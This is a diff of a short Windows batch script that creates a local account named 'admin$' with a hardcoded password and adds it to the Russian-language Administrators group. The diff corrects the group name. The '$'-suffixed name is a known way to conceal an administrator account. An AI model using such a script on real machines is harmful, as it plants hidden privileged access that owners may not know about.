@@ -1,7 +1,7 @@
 @echo off
 set user=admin$
 set passwd=Pa$$worD
-set group=Администратор
+set group=Администраторы
 net user %user% %passwd% /add
 chcp 1251 >nul
 net localgroup %group% %user% /add
